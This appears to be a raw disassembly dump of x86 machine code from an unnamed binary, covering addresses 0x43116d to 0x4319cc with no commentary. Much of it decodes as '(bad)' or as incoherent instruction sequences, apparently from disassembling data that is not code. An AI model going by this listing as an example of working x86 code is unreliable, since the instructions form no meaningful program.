  43116d:	mov    eax,DWORD PTR [eax]
  43116f:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431175:	add    al,0x0
  431177:	inc    ebp
  431178:	mov    eax,DWORD PTR [ebx]
  43117a:	mov    ebp,ebx
  43117c:	cmp    al,0xf
  43117e:	or     al,al
  431180:	inc    ebp
  431181:	inc    ebp
  431182:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  431188:	cld    
  431189:	add    BYTE PTR [edi+0x546c16c0],dh
  43118f:	add    BYTE PTR [ecx-0x5],dl
  431192:	add    eax,0x17200
  431197:	sbb    al,0x85
  431199:	dec    esp
  43119a:	je     0x4311d4
  43119c:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4311a0:	add    BYTE PTR [ebx],bh
  4311a2:	(bad)  
  4311a3:	and    al,0x32
  4311a5:	jae    0x431143
  4311a7:	mov    cl,cl
  4311a9:	inc    DWORD PTR [esp]
  4311ac:	push   ebp
  4311ad:	shr    esp,0x8
  4311b0:	in     al,dx
  4311b1:	push   esp
  4311b2:	add    DWORD PTR [eax],esp
  4311b4:	add    bl,cl
  4311b6:	inc    ebp
  4311b7:	mov    bh,0x89
  4311b9:	add    ah,bh
  4311bb:	jmp    0xca752105
  4311c0:	pushf  
  4311c1:	dec    esp
  4311c2:	mov    edx,0xf8178520
  4311c7:	fst    DWORD PTR [ebp+0x0]
  4311ca:	mov    BYTE PTR [eax],0xc4
  4311cd:	sub    edx,DWORD PTR [ebx-0x3f]
  4311d0:	inc    ebp
  4311d1:	add    eax,0xc601da
  4311d6:	mov    al,0xc6
  4311d9:	ins    BYTE PTR es:[edi],dx
  4311da:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  4311e1:	dec    esp
  4311e2:	jmp    DWORD PTR [eax]
  4311e4:	inc    ebp
  4311e5:	fnstcw WORD PTR [esi+0x29]
  4311e8:	test   BYTE PTR [eax],0xc8
  4311eb:	rol    BYTE PTR [eax],0xc0
  4311ee:	lea    ecx,[ebp-0x3cf0dbcb]
  4311f4:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4311fa:	inc    esi
  4311fb:	add    DWORD PTR [eax],ebx
  4311fd:	add    dh,bh
  4311ff:	mov    esi,DWORD PTR [edx+0x8]
  431202:	(bad)  
  431203:	fdiv   QWORD PTR ss:[ecx]
  431206:	(bad)  
  431207:	mov    bl,ch
  431209:	add    esi,eax
  43120b:	add    dh,bl
  43120d:	or     esi,eax
  43120f:	mov    dl,0xdf
  431211:	add    esi,eax
  431213:	add    al,ah
  431215:	push   cs
  431216:	mov    BYTE PTR [edx+0xc601e1],0xe2
  43121d:	or     BYTE PTR [ebx],dh
  43121f:	dec    ecx
  431220:	lea    eax,[ebx]
  431222:	xor    eax,0x18fc0fc7
  431227:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431228:	repz clc 
  43122a:	add    eax,DWORD PTR [ebp+0x46]
  43122d:	prefetcht0 BYTE PTR [ecx-0x2]
  431231:	xor    eax,0x7c60872
  431236:	mov    esp,0xbd32c69b
  43123b:	pop    esi
  43123c:	mov    cl,0xbe
  43123f:	or     al,0xc6
  431241:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431248:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43124f:	add    dh,al
  431251:	mov    eax,ebx
  431253:	xor    DWORD PTR [ebx],0x35008dbc
  431259:	mov    ecx,DWORD PTR [edi]
  43125b:	sbb    al,0x18
  43125d:	inc    ebp
  43125e:	xrelease mov DWORD PTR [ebx],0x188546f4
  431265:	clc    
  431266:	(bad)  
  431267:	xor    DWORD PTR [edx-0x64],esi
  43126a:	lea    ecx,[ecx+0x45ffe838]
  431270:	mov    ecx,ebx
  431272:	fadd   st,st(6)
  431274:	dec    ebp
  431275:	lds    edi,FWORD PTR [eax+0x7145fc56]
  43127b:	out    0x1,eax
  43127d:	inc    ebp
  43127e:	lea    ebp,ds:0xc8ffc6ff
  431284:	enter  0xa33,0xc6
  431288:	push   ebp
  431289:	leave  
  43128a:	(bad)  
  43128b:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  431291:	add    BYTE PTR [ebp+0x44],al
  431294:	mov    eax,esp
  431296:	mov    WORD PTR [esi+0x46398300],?
  43129c:	psubusw mm4,QWORD PTR [esi-0x78]
  4312a0:	add    BYTE PTR [ebx-0x1303f975],al
  4312a6:	add    BYTE PTR [ebp+0x1],0xeb
  4312aa:	add    BYTE PTR [ebp+0x38],al
  4312ad:	in     eax,dx
  4312ae:	inc    ebp
  4312af:	inc    ebp
  4312b0:	mov    ebx,ebx
  4312b2:	add    BYTE PTR [ebp+0x0],0xec
  4312b6:	mov    DWORD PTR [ebp-0x41],eax
  4312b9:	sub    eax,0x2c00454e
  4312be:	ins    DWORD PTR es:[edi],dx
  4312bf:	inc    ebp
  4312c0:	add    BYTE PTR [esi+0x66],bh
  4312c3:	test   BYTE PTR [ebp-0x2300bc],0xb6
  4312ca:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  4312d4:	dec    edi
  4312d5:	pop    es
  4312d6:	add    ah,ch
  4312d8:	mov    DWORD PTR [ebp+0x68],eax
  4312db:	in     eax,dx
  4312dc:	inc    DWORD PTR [ebp-0x7d]
  4312df:	out    0xc0,al
  4312e1:	inc    ebp
  4312e2:	mov    edx,esp
  4312e4:	push   0x45
  4312e6:	(bad)  
  4312e7:	jmp    0xdf9258a4
  4312ec:	add    BYTE PTR [ebp-0x77],al
  4312ef:	out    dx,al
  4312f0:	ins    BYTE PTR es:[edi],dx
  4312f1:	inc    ebp
  4312f2:	jmp    edi
  4312f4:	add    DWORD PTR [ebp-0x14],0x7e
  4312f8:	mov    esi,esi
  4312fa:	outs   dx,BYTE PTR ds:[esi]
  4312fb:	inc    esp
  4312fc:	(bad)  
  4312fd:	mov    esp,0x8341b68d
  431302:	mov    DWORD PTR [esi+0x70],eax
  431305:	fcos   
  431307:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  43130d:	in     al,dx
  43130e:	jb     0x431295
  431310:	(bad)  
  431311:	dec    DWORD PTR [ebx-0x7aba9901]
  431317:	mov    edi,edi
  431319:	fdivr  st,st(7)
  43131b:	out    dx,eax
  43131c:	rcl    BYTE PTR [ebx],0x66
  43131f:	mov    DWORD PTR [ebp-0xc70075],eax
  431325:	(bad)  
  431326:	std    
  431327:	cmp    eax,DWORD PTR [eax]
  431329:	jne    0x431391
  43132b:	mov    DWORD PTR [ebp-0xba0048],eax
  431331:	in     al,dx
  431332:	outs   dx,BYTE PTR ds:[esi]
  431333:	pushf  
  431334:	add    BYTE PTR [ebx-0x7f7a039a],cl
  43133a:	inc    DWORD PTR [ecx]
  43133c:	inc    DWORD PTR [eax]
  43133e:	jae    0x431378
  431340:	add    BYTE PTR [ebp+0x850266],al
  431346:	inc    DWORD PTR [ebp-0x1]
  431349:	mov    eax,eax
  43134b:	jl     0x4313b3
  43134d:	add    BYTE PTR [ebp-0x740077],al
  431353:	cld    
  431354:	dec    eax
  431355:	add    BYTE PTR [eax],0x1
  431358:	data16 add BYTE PTR [ebp+0x38],al
  43135c:	mov    eax,0x47c2
  431361:	mov    eax,0x824f89
  431366:	inc    edi
  431367:	mov    DWORD PTR [edx+0x64],ebp
  43136a:	inc    WORD PTR [ebp-0x75]
  43136e:	(bad)  
  43136f:	data16 rol BYTE PTR [ebp-0x16001a],1
  431376:	inc    ebp
  431377:	jge    0x431358
  431379:	add    bh,ah
  43137b:	lea    ax,[ebp-0x750030]
  431382:	add    al,0x46
  431385:	jmp    0x40ff:0x8885
  43138b:	push   DWORD PTR [ebp+0x52]
  43138e:	lea    eax,[eax]
  431390:	shl    BYTE PTR [esi-0x7b],1
  431393:	test   esi,edi
  431395:	(bad)  
  431396:	(bad)  
  431397:	inc    DWORD PTR [ebp-0x990140]
  43139d:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  4313a3:	inc    edi
  4313a4:	push   ecx
  4313a5:	xor    ax,WORD PTR [ebp-0x8d0045]
  4313ac:	add    al,al
  4313ae:	ret    
  4313af:	mov    ax,WORD PTR [ebp-0x3f0004]
  4313b6:	push   eax
  4313b7:	mov    DWORD PTR [ebp-0x77],0xff98748b
  4313be:	add    BYTE PTR [ebx-0x764f8839],al
  4313c4:	push   DWORD PTR [esi+0x1]
  4313c7:	inc    DWORD PTR [eax]
  4313c9:	mov    eax,0xff99ff
  4313ce:	or     BYTE PTR [ecx-0x7a87bb],cl
  4313d4:	jne    0x43138e
  4313d6:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  4313e0:	mov    ecx,0xd74fb8
  4313e5:	add    cl,al
  4313e7:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4313ed:	or     DWORD PTR [ebx+0x558966dc],0x7e
  4313f4:	(bad)  
  4313f5:	push   ebp
  4313f7:	mov    eax,0x8c2789
  4313fc:	ret    0x6689
  4313ff:	adc    BYTE PTR [ebp+0x48],0x8d
  431403:	add    bh,ah
  431405:	mov    WORD PTR [ebp-0x70],ax
  431409:	(bad)  
  43140a:	ret    0x667d
  43140d:	or     BYTE PTR [ebp-0x77],dl
  431410:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431417:	loop   0x4313a2
  431419:	(bad)  
  43141a:	xchg   esi,eax
  43141b:	aam    0xcf
  43141d:	out    dx,al
  43141e:	mov    DWORD PTR [esi-0x68],edi
  431421:	inc    ebp
  431422:	dec    edx
  431423:	pop    ecx
  431424:	mov    edx,DWORD PTR [eax]
  431426:	repnz push bp
  431429:	or     BYTE PTR [ebx+0x55106638],0x49
  431430:	(bad)  
  431431:	repnz xor eax,0xa0898945
  431437:	mov    ah,0x89
  431439:	jmp    DWORD PTR [edx+0x66b0418d]
  43143f:	inc    DWORD PTR [ebp+0x50]
  431442:	add    DWORD PTR [ebp-0x5],0xffffffbe
  431446:	mov    DWORD PTR [eax],ecx
  431448:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431449:	pop    es
  43144a:	inc    ecx
  43144b:	(bad)  
  43144c:	data16 fwait
  43144e:	inc    ebp
  43144f:	xor    ah,BYTE PTR [esi+0x3]
  431452:	dec    ebp
  431453:	push   eax
  431454:	inc    bp
  431456:	jge    0x4313db
  431458:	mov    esp,DWORD PTR [esi-0x18]
  43145b:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  431461:	add    DWORD PTR [ebx],esi
  431463:	add    BYTE PTR [ebx],al
  431465:	test   DWORD PTR [ebx],esi
  431467:	(bad)  
  431468:	inc    WORD PTR [ebp+0x0]
  43146c:	mov    eax,DWORD PTR [eax]
  43146e:	call   0x8898cba3
  431473:	mov    esi,eax
  431475:	clc    
  431476:	ret    
  431477:	rol    cl,0xa
  43147a:	mov    DWORD PTR ds:0x7c0ec88,esi
  431480:	mov    edx,edi
  431482:	pushf  
  431483:	pop    es
  431484:	jmp    FWORD PTR [edx+0x66]
  431487:	add    BYTE PTR [ebp-0x990175],al
  43148d:	inc    ebp
  43148e:	test   DWORD PTR [ebx-0x2f00f202],eax
  431494:	push   ebp
  431495:	mov    edi,eax
  431497:	mov    dh,BYTE PTR [eax+0x266ff51]
  43149d:	push   ebp
  43149e:	add    BYTE PTR [ebx-0x764b0777],al
  4314a4:	dec    DWORD PTR [esi+0x661851e8]
  4314aa:	add    BYTE PTR [ebp-0x7b],dl
  4314ad:	cmp    esi,0xfffffffb
  4314b0:	dec    DWORD PTR [ecx+0x51fe9285]
  4314b6:	jmp    DWORD PTR [esi-0x75]
  4314b9:	push   ebp
  4314ba:	hlt    
  4314bb:	data16 (bad) 
  4314bd:	dec    ebp
  4314be:	ret    
  4314bf:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4314c5:	lea    edx,[eax-0x1]
  4314c8:	jne    0x43149b
  4314ca:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4314d0:	dec    BYTE PTR [ecx+0x51559eff]
  4314d6:	mov    DWORD PTR [esi-0x4c],esp
  4314d9:	push   ebp
  4314da:	jmp    DWORD PTR [esi-0x18]
  4314dd:	inc    ebp
  4314de:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4314e4:	(bad)  
  4314e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4314e6:	inc    eax
  4314e8:	test   DWORD PTR [esi-0x2],esp
  4314eb:	inc    ebp
  4314ec:	dec    DWORD PTR [ebp-0x760bde75]
  4314f2:	(bad)  
  4314f3:	test   al,0xc3
  4314f5:	mov    DWORD PTR [ebp-0x769b56],ecx
  4314fb:	lods   al,BYTE PTR ds:[esi]
  4314fc:	push   eax
  4314fd:	inc    ebp
  4314fe:	jne    0x43150f
  431500:	dec    DWORD PTR [ebp+0x8]
  431503:	mov    ecx,DWORD PTR [ebx]
  431505:	sbb    al,0x0
  431507:	(bad)  
  431508:	mov    eax,0xc14fc3
  43150d:	mov    DWORD PTR [ecx-0xbabf64],ecx
  431513:	movsx  ecx,WORD PTR [ebp+0x4e]
  431517:	xor    eax,DWORD PTR [eax]
  431519:	add    eax,edi
  43151b:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  431521:	xor    edi,DWORD PTR [eax+0x854f66]
  431527:	dec    BYTE PTR [ecx-0x76bb01]
  43152d:	mov    BYTE PTR [ebx-0x76724001],al
  431533:	pushf  
  431534:	inc    esi
  431535:	(bad)  
  431536:	dec    DWORD PTR [ebp-0x7abe6373]
  43153c:	sar    esi,0x89
  43153f:	dec    DWORD PTR [eax+0x0]
  431542:	inc    DWORD PTR [eax]
  431544:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  43154b:	xlat   BYTE PTR ds:[ebx]
  43154c:	dec    edx
  43154d:	add    bh,bh
  43154f:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  431555:	lea    esp,[esi-0x50]
  431558:	(bad)  
  431559:	(bad)  
  43155a:	call   DWORD PTR [eax-0x1]
  43155d:	inc    ebp
  43155e:	rdpmc  
  431560:	add    BYTE PTR [ebx],al
  431562:	push   ax
  431564:	lea    eax,[ebp-0x1]
  43156a:	js     0x43156b
  43156c:	add    al,bh
  43156e:	push   bp
  431570:	lea    ecx,[ebp-0x7701]
  431576:	fmul   DWORD PTR [ebp-0x7a997800]
  43157c:	(bad)  
  43157d:	(bad)  
  43157e:	(bad)  
  43157f:	(bad)  
  431580:	jmp    DWORD PTR [ecx-0x7676ffb3]
  431586:	dec    eax
  431587:	mov    eax,0x8d8dffff
  43158c:	mov    al,0xb0
  43158e:	(bad)  
  43158f:	call   DWORD PTR [ecx+0x50]
  431592:	dec    ebp
  431593:	inc    ebp
  431594:	mov    esi,0x7030833
  431599:	push   eax
  43159a:	into   
  43159b:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  4315a1:	call   DWORD PTR [ecx-0x8]
  4315a4:	lea    edx,[ebp-0x1]
  4315a7:	jmp    0x7617ab
  4315ac:	inc    eax
  4315ad:	jnp    0x43153c
  4315af:	add    dh,bh
  4315b1:	inc    WORD PTR [ebp-0x8a00b0]
  4315b8:	mov    edx,eax
  4315ba:	inc    esp
  4315bb:	add    bh,bh
  4315bd:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  4315c3:	dec    DWORD PTR [ebx-0x7f820301]
  4315c9:	add    BYTE PTR [ecx],al
  4315cb:	data16 add BYTE PTR [ebp-0xb30077],al
  4315d2:	inc    eax
  4315d4:	(bad)  
  4315d5:	dec    si
  4315d7:	test   edi,edi
  4315d9:	(bad)  
  4315da:	cmp    edi,edi
  4315dc:	add    ecx,DWORD PTR [edi-0x39]
  4315df:	mov    edx,DWORD PTR [edx+0x66]
  4315e2:	inc    DWORD PTR [ebp-0x3d00cb]
  4315e8:	mov    eax,0x66ff8b5e
  4315ee:	jmp    0xb4ff:0xc7ff3895
  4315f5:	push   ecx
  4315f6:	inc    DWORD PTR [ebx-0x76ffccbb]
  4315fc:	call   DWORD PTR [esi-0x1]
  4315ff:	dec    DWORD PTR [eax]
  431601:	mov    ecx,0x805ff
  431606:	inc    ebp
  431607:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  43160d:	mov    ecx,0x35784
  431612:	add    BYTE PTR [ecx-0xffa59b],cl
  431618:	inc    ebp
  431619:	mov    ecx,0x9c6131
  43161e:	(bad)  
  43161f:	mov    eax,ebx
  431621:	pop    esp
  431622:	test   edi,edi
  431624:	clc    
  431625:	lea    eax,[ebp-0x24]
  431628:	cmp    eax,0xc7fe9c8d
  43162d:	push   eax
  43162f:	lea    eax,[ebp+0x45fff8fe]
  431635:	mov    esi,DWORD PTR [ecx]
  431637:	hlt    
  431638:	lahf   
  431639:	push   esp
  43163a:	mov    edx,DWORD PTR [ecx-0x4]
  43163d:	xor    eax,DWORD PTR [eax+0x7201bb]
  431643:	add    BYTE PTR [ebp-0x35],al
  431646:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  43164c:	mov    edx,DWORD PTR [ecx-0x74]
  43164f:	rol    BYTE PTR [eax],0x8d
  431652:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  431656:	nop
  431657:	push   ecx
  431658:	add    bh,bh
  43165a:	mov    esp,edi
  43165c:	in     al,0x85
  43165e:	jge    0x43165e
  431660:	test   edi,edi
  431662:	jne    0x4315e9
  431664:	(bad)  
  431665:	(bad)  
  431666:	sbb    bh,bh
  431668:	push   ebp
  431669:	inc    ebp
  43166a:	call   0xffdc10fa
  43166f:	add    BYTE PTR [ebp+0x66],al
  431672:	mov    edx,DWORD PTR [ebp-0xfc0075]
  431678:	cmp    al,0x85
  43167a:	ud0    eax,DWORD PTR [ebp-0x1]
  43167e:	test   DWORD PTR [edi+0x74],ecx
  431681:	dec    edi
  431682:	inc    DWORD PTR [ebp-0x50004]
  431688:	dec    DWORD PTR [edi-0x75]
  43168b:	dec    esi
  43168c:	cld    
  43168d:	test   DWORD PTR [eax+0xff01ff],eax
  431693:	icebp  
  431694:	add    BYTE PTR [edi-0x3a],cl
  431697:	test   ebx,eax
  431699:	inc    BYTE PTR [ebp-0x1]
  43169c:	jne    0x43169e
  43169e:	mov    eax,DWORD PTR [eax]
  4316a0:	cld    
  4316a1:	xor    BYTE PTR [ecx+0x500155],cl
  4316a7:	push   ebp
  4316a8:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4316ae:	add    BYTE PTR [ebp+0x35e90f50],al
  4316b4:	add    al,BYTE PTR [eax]
  4316b6:	add    BYTE PTR [ebx-0x38fe4f80],al
  4316bc:	add    ah,ch
  4316be:	or     BYTE PTR [ebp+0x4501f845],dh
  4316c4:	jmp    0xdf19ba
  4316c9:	(bad)  
  4316ca:	nop    ecx
  4316cd:	test   DWORD PTR [ebp+0x4502f8],eax
  4316d3:	xor    ecx,DWORD PTR [ebp-0x64]
  4316d6:	mov    eax,edi
  4316d8:	mov    ebx,DWORD PTR [eax+edx*2]
  4316db:	add    eax,0x45fef885
  4316e0:	dec    DWORD PTR [ebx+0x339445]
  4316e6:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4316ec:	dec    DWORD PTR [ebx-0x460f0375]
  4316f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4316f3:	add    esi,edi
  4316f5:	add    bh,bh
  4316f7:	rdpmc  
  4316f9:	add    BYTE PTR [ebx],0x1
  4316fc:	mov    DWORD PTR [eax],eax
  4316fe:	add    al,0x45
  431700:	dec    DWORD PTR [ecx-0x360b3373]
  431706:	dec    DWORD PTR [esi]
  431708:	push   eax
  431709:	jne    0x431750
  43170b:	mov    esi,DWORD PTR [ebx]
  43170d:	cld    
  43170e:	add    esp,ecx
  431710:	push   eax
  431711:	inc    DWORD PTR [ebp-0x75]
  431714:	add    eax,0x800e4
  431719:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43171f:	mov    DWORD PTR [ecx],eax
  431721:	sbb    al,0x0
  431723:	leave  
  431724:	test   DWORD PTR [edi-0x2],eax
  431727:	jne    0x431728
  431729:	call   0xff44012e
  43172e:	xor    BYTE PTR [ebp+0x4d],al
  431731:	mov    edi,edi
  431733:	enter  0x8,0x4d
  431737:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  43173d:	mov    eax,DWORD PTR [eax]
  43173f:	cld    
  431740:	add    DWORD PTR [ecx],ebx
  431742:	inc    ebp
  431743:	dec    ebp
  431744:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  43174a:	inc    eax
  43174b:	dec    DWORD PTR [ecx-0x270375]
  431751:	add    BYTE PTR [ebx-0x39d72701],cl
  431757:	xchg   ecx,eax
  431758:	ret    
  431759:	add    BYTE PTR [ebp-0x830075],al
  43175f:	add    BYTE PTR [ebp-0x75],al
  431762:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431768:	lea    edi,[edi-0xc]
  43176b:	add    bh,bh
  43176d:	mov    edx,DWORD PTR [eax-0x7b]
  431770:	inc    ebp
  431771:	rdpmc  
  431773:	jne    0x431778
  431775:	add    BYTE PTR [eax-0x75],dl
  431778:	inc    ebp
  431779:	clc    
  43177a:	add    eax,0x400009
  43177f:	mov    DWORD PTR [ebx-0x7f000304],ecx
  431785:	mov    eax,DWORD PTR [ecx]
  431787:	in     al,dx
  431788:	add    dh,al
  43178a:	test   ebx,eax
  43178c:	inc    BYTE PTR [ebp-0xff0001]
  431792:	add    BYTE PTR [ebp-0x43],al
  431795:	cmp    esi,0xfffffff8
  431798:	(bad)  
  431799:	push   DWORD PTR [eax]
  43179b:	add    BYTE PTR [ebp-0x3a],dl
  43179e:	test   ebx,eax
  4317a0:	je     0x431727
  4317a2:	mov    edi,edi
  4317a4:	sbb    al,0xff
  4317a6:	test   DWORD PTR gs:[eax],eax
  4317a9:	(bad)  
  4317aa:	js     0x4317ab
  4317ac:	add    BYTE PTR [ebx-0x39b20bdd],cl
  4317b2:	sub    eax,ebx
  4317b4:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4317ba:	add    eax,DWORD PTR [eax]
  4317bc:	dec    ebp
  4317bd:	push   eax
  4317be:	mov    al,BYTE PTR [ebp+0x1]
  4317c1:	mov    eax,DWORD PTR [ebp-0x68]
  4317c4:	mov    eax,DWORD PTR [eax]
  4317c6:	sbb    bh,al
  4317c8:	or     ah,dh
  4317ca:	dec    ebp
  4317cb:	inc    DWORD PTR [eax+0x4]
  4317ce:	push   ecx
  4317cf:	add    BYTE PTR [edx-0x1],dh
  4317d2:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4317d8:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4317e2:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4317e8:	push   ecx
  4317e9:	cmp    BYTE PTR [ebx],al
  4317eb:	inc    ebp
  4317ec:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4317f2:	(bad)  
  4317f3:	(bad)  
  4317f4:	in     al,0xff
  4317f6:	add    BYTE PTR [ebp+0x0],al
  4317f9:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4317ff:	add    al,bh
  431801:	(bad)  
  431802:	jmp    0x8d85:0x74b0558d
  431809:	dec    DWORD PTR [eax]
  43180b:	call   DWORD PTR [ebp-0x7b]
  43180e:	mov    edi,esi
  431810:	lock call DWORD PTR [ebp-0x75]
  431814:	mov    esi,esp
  431816:	mov    ah,0xc6
  431818:	mov    bh,0xc3
  43181a:	mov    DWORD PTR [ebx-0x110003c4],ecx
  431820:	add    DWORD PTR [eax],0x450050ff
  431826:	mov    DWORD PTR [ebx+0x9598cc],ecx
  43182c:	inc    edi
  43182e:	push   esp
  431830:	jmp    0xcd00:0x650481ff
  431837:	mov    DWORD PTR [ebx],esi
  431839:	clc    
  43183a:	cmp    edi,0xff9cff3c
  431840:	jne    0x43184a
  431842:	mov    eax,eax
  431844:	add    esi,DWORD PTR [eax]
  431846:	int3   
  431847:	inc    ebp
  431848:	cmp    al,0x83
  43184a:	add    BYTE PTR [eax],bl
  43184c:	adc    DWORD PTR [ebx+0x768b5055],eax
  431852:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431858:	mov    edi,eax
  43185a:	cmp    BYTE PTR [ebp+0x45],cl
  43185d:	jmp    0x4317ea
  43185f:	mov    ebx,DWORD PTR [esp+ebp*8]
  431862:	inc    ebp
  431863:	or     al,0x2
  431865:	dec    DWORD PTR [ebp+0x18]
  431868:	jne    0x4318bf
  43186a:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  431870:	mov    edi,DWORD PTR [ebx]
  431872:	in     al,0x50
  431874:	xchg   ecx,eax
  431875:	jmp    0x343677a
  43187a:	adc    al,0x8b
  43187c:	inc    ebp
  43187d:	mov    al,ds:0x8b04008b
  431882:	push   ebp
  431883:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  431889:	push   ebp
  43188a:	test   DWORD PTR [ebx-0x2800d701],ecx
  431890:	inc    ebp
  431891:	dec    ebp
  431892:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431898:	mov    DWORD PTR [eax],0xe9ff00f4
  43189e:	add    al,0x0
  4318a0:	add    BYTE PTR [eax],al
  4318a2:	mov    eax,edx
  4318a4:	push   eax
  4318a5:	rol    DWORD PTR [ebp-0xf0177],1
  4318ab:	bound  eax,QWORD PTR [ebp+0x50]
  4318ae:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4318b4:	add    BYTE PTR [ecx+0x558df0ff],cl
  4318ba:	mov    al,0xf
  4318bc:	test   DWORD PTR [edx],edx
  4318be:	call   DWORD PTR [ebp-0x7a0001]
  4318c4:	(bad)  
  4318c5:	loop   0x4318c6
  4318c7:	jnp    0xc6990ccd
  4318cd:	mov    eax,ebx
  4318cf:	cmp    al,0x8b
  4318d1:	(bad)  
  4318d2:	cld    
  4318d3:	shr    esi,0xc
  4318d6:	add    dl,al
  4318d8:	push   eax
  4318d9:	lea    eax,[ebp-0x1]
  4318dc:	mov    edx,esi
  4318de:	cwde   
  4318df:	cli    
  4318e0:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4318e6:	or     BYTE PTR [eax],cl
  4318e8:	inc    ebp
  4318e9:	dec    ebp
  4318ea:	inc    DWORD PTR [ebx+0x74803914]
  4318f0:	add    DWORD PTR [ebx+0x451800],ecx
  4318f6:	call   DWORD PTR [eax+edx*1]
  4318f9:	add    ecx,DWORD PTR [ebp-0x34]
  4318fc:	push   edi
  4318fd:	adc    al,0x8
  4318ff:	mov    edx,DWORD PTR [ebp-0x14]
  431902:	mov    ecx,DWORD PTR [ebp+0x18]
  431905:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  431909:	inc    DWORD PTR [eax+esi*8]
  43190c:	inc    ebp
  43190d:	stos   BYTE PTR es:[edi],al
  43190e:	mov    edx,DWORD PTR [ebp-0x4]
  431911:	add    DWORD PTR [ebp-0x1c],eax
  431914:	mov    edx,DWORD PTR [ebp-0x70]
  431917:	cmp    eax,DWORD PTR [eax]
  431919:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43191a:	mov    eax,DWORD PTR [eax]
  43191c:	cld    
  43191d:	jae    0x43189f
  43191f:	add    eax,DWORD PTR [ecx]
  431921:	clc    
  431922:	add    BYTE PTR [eax+0x30],dl
  431925:	mov    DWORD PTR [ecx],esi
  431927:	clc    
  431928:	pop    ds
  431929:	inc    ebp
  43192a:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  431930:	(bad)  
  431931:	push   DWORD PTR [edi]
  431933:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431939:	(bad)  
  43193a:	jae    0x43193b
  43193c:	mov    eax,DWORD PTR [ebp-0x740175]
  431942:	sub    eax,DWORD PTR [eax]
  431944:	add    eax,DWORD PTR [eax]
  431946:	mov    DWORD PTR [ecx+0x5f],eax
  431949:	mov    DWORD PTR [ebx-0x4],ebx
  43194c:	ret    0xff
  43194f:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431955:	ret    
  431956:	mov    eax,DWORD PTR [ebp-0x6f0075]
  43195c:	add    BYTE PTR [ebp-0x7d],al
  43195f:	mov    DWORD PTR [eax],eax
  431961:	add    al,0x84
  431963:	inc    DWORD PTR [ecx]
  431965:	lea    eax,[eax]
  431967:	hlt    
  431968:	sar    bh,cl
  43196a:	test   BYTE PTR [eax+0x1],dl
  43196d:	inc    ebp
  43196e:	add    BYTE PTR [ebx],dh
  431970:	test   BYTE PTR [ebx],0x84
  431973:	push   eax
  431974:	add    BYTE PTR [ebp+0x0],al
  431977:	add    eax,0x86
  43197c:	add    BYTE PTR [ebx-0x7f7b0340],cl
  431982:	add    BYTE PTR [ecx],al
  431984:	add    BYTE PTR [eax],al
  431986:	mov    esi,0x550030
  43198b:	mov    ecx,DWORD PTR [edi]
  43198d:	cld    
  43198e:	fidiv  DWORD PTR [ebp+0x0]
  431991:	mov    edi,DWORD PTR [ecx]
  431993:	xor    BYTE PTR [eax+eax*1],0x84
  431997:	add    eax,DWORD PTR [eax]
  431999:	sbb    BYTE PTR [eax],al
  43199b:	jne    0x43194e
  43199d:	mov    eax,DWORD PTR [ecx]
  43199f:	sbb    BYTE PTR [eax],al
  4319a1:	mov    DWORD PTR [ebp-0x1],esp
  4319a4:	add    BYTE PTR [eax+0x30e45ca],bh
  4319aa:	ret    0xb7fc
  4319ad:	dec    ebp
  4319ae:	or     al,0x89
  4319b0:	dec    ebp
  4319b1:	cld    
  4319b2:	cmovne ecx,DWORD PTR [eax-0x75]
  4319b6:	add    edi,esp
  4319b8:	seto   BYTE PTR [esi-0x72ffffff]
  4319bf:	inc    ebp
  4319c0:	adc    al,0x8b
  4319c2:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4319c9:	cmp    DWORD PTR [edi+0x72],edx
  4319cc:	xor    DWORD PTR [ebx-0x74ee7481],ecx
